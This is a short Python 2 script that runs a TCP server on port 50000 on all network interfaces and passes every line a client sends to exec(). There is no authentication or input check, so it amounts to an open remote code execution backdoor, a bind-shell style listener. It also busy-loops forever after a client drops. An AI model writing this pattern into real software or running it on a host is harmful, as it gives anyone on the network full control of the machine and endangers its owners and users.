import socket
import sys

def main():
    host = ""
    port = 50000
    backlog = 5
    size = 1024
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(backlog)
    while True:
        client, address = sock.accept()
        
        while True:
            data = client.recv(size).rstrip()
            if not data:
                continue
            
            if data == "disconnect":
                
                client.send(data)
                client.close()
                break
            if data == "exit":
               
                client.send(data)
                client.close()
                return

            
            try:
                exec(data)
            except Exception, err:
                print(err)

main()